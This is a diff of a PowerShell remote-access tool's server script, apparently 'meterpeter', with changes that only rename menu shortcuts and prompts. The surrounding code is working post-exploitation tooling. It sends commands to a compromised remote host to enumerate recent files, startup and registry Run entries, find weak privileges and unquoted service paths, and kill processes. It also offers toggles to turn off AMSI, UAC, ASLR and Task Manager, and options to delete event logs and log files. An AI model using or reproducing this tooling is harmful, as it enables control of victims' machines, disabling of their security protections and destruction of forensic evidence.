@@ -442,7 +442,7 @@ While($Client.Connected)
         write-host " List of Remote-Host Recent Contents." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "powershell dir `$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent `> startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force";
       }
-      If($choise -eq "ListPriv" -or $choise -eq "icacls")
+      If($choise -eq "ListPriv" -or $choise -eq "Priv")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     -------";
@@ -450,7 +450,7 @@ While($Client.Connected)
         write-host "   WeakDir   Search weak privs recursive     Client:User  - Privileges Required";
         write-host "   Service   Search Unquoted Service Paths   Client:User  - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Adv:icacls> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n :meterpeter:Adv:Priv> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
         If($my_choise -eq "Check" -or $my_choise -eq "check")
         {
@@ -485,7 +485,7 @@ While($Client.Connected)
         write-host " List of Remote-Host Drives Available." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-PSDrive -PSProvider 'FileSystem'|Select-Object Name,Provider,Root|Format-Table `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
       }
-      If($choise -eq "StartUp" -or $choise -eq "startup")
+      If($choise -eq "StartUp" -or $choise -eq "start")
       {
         write-host " List Remote-Host StartUp Contents." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "cmd /R dir /a `"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup`" `> startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force";
@@ -496,7 +496,7 @@ While($Client.Connected)
         #$Command = "cmd /R wmic startup get Caption,Description,Location > runen.txt;Get-content runen.txt;Remove-Item runen.txt -Force";
         $Command = "Get-Item -path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce`" `> runen.txt;Get-Item -path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`" `>`> runen.txt;Get-Item -path `"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run`" `>`> runen.txt;Get-ItemProperty -path `"HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`" -name Userinit|Select-Object PSChildName,PSDrive,Userinit `>`> runen.txt;Get-content runen.txt;Remove-Item runen.txt -Force";
       }
-      If($choise -eq "ListTask" -or $choise -eq "tasks")
+      If($choise -eq "ListTask" -or $choise -eq "task")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     -------";
@@ -505,7 +505,7 @@ While($Client.Connected)
         write-host "   Create    Create Remote-Host New Task     Client:User  - Privileges Required";
         write-host "   Delete    Delete Remote-Host Single Task  Client:User  - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Adv:Tasks> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n :meterpeter:Adv:Task> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
         If($my_choise -eq "Check" -or $my_choise -eq "check")
         {
@@ -556,14 +556,14 @@ While($Client.Connected)
         write-host "   Check     List Remote Processe(s) Running    Client:User  - Privileges Required";
         write-host "   KillProc  Kill Remote Process From Running   Client:Admin - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Adv:Process> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n :meterpeter:Adv:Proc> " -NoNewline -ForeGroundColor Green;
         $wifi_choise = Read-Host;
         If($wifi_choise -eq "Check" -or $wifi_choise -eq "check")
         {
         write-host " List of Remote-Host Processe(s) Runing." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-Process|Select-Object Name,Path,Company,Product,StartTime `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }
-        If($wifi_choise -eq "KillProc" -or $wifi_choise -eq "proc")
+        If($wifi_choise -eq "KillProc" -or $wifi_choise -eq "kill")
         {
           Write-Host " - Process Name: " -NoNewline;
           $Proc_name = Read-Host;
@@ -772,7 +772,7 @@ While($Client.Connected)
       write-host "   GoogleX   Open Google Sphere(prank)       Open Remote Browser in google sphere";
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
-      write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User OR ADMIN Privs Required";
+      write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User OR Admin Priv Required";
       write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
@@ -889,7 +889,7 @@ While($Client.Connected)
         $shutdown_msg = $Null;
         $shutdown_time = $Null;
       }
-      If($choise -eq "ListLog" -or $choise -eq "logs")
+      If($choise -eq "ListLog" -or $choise -eq "log")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
@@ -897,7 +897,7 @@ While($Client.Connected)
         write-host "   DelLogs   Del  Remote-Host EventLogs      Client:Admin - Privs required";
         write-host "   DelFull   Del  Remote-Host LogFiles       Client:Admin - Privs required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Logs> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n :meterpeter:Post:Log> " -NoNewline -ForeGroundColor Green;
         $logs_choise = Read-Host;
         If($logs_choise -eq "Check" -or $logs_choise -eq "check")
         {
